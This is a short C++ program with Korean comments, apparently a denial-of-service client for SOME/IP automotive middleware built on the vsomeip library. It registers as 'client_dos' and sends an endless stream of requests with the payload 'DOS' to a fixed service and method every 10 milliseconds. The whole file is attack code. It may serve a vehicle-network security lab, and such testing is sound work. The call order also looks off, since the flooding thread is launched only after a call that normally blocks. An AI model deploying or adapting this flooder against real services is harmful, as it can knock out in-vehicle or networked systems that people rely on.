#include <vsomeip/vsomeip.hpp>
#include <iostream>
#include <thread>
#include <chrono>

std::shared_ptr<vsomeip::application> app;

void send_dos_requests() {
    vsomeip::service_t service_id = 0x1234;
    vsomeip::instance_t instance_id = 0x5678;
    vsomeip::method_t method_id = 0x0421;  // 임의의 method

    while (true) {
        auto request = vsomeip::runtime::get()->create_request();

        request->set_service(service_id);
        request->set_instance(instance_id);
        request->set_method(method_id);

        auto payload = vsomeip::runtime::get()->create_payload();
        std::vector<vsomeip::byte_t> data{'D', 'O', 'S'};
        payload->set_data(data);
        request->set_payload(payload);

        std::cout << "[CLIENT_DOS] Sending request..." << std::endl;
        app->send(request);

        std::this_thread::sleep_for(std::chrono::milliseconds(10)); // 10ms 간격
    }
}

int main() {
    app = vsomeip::runtime::get()->create_application("client_dos");

    if (!app->init()) {
        std::cerr << "Couldn't initialize application" << std::endl;
        return 1;
    }

    app->start();
    std::thread(send_dos_requests).detach();

    app->stop();  // 실제로는 도달하지 않음
    return 0;
}
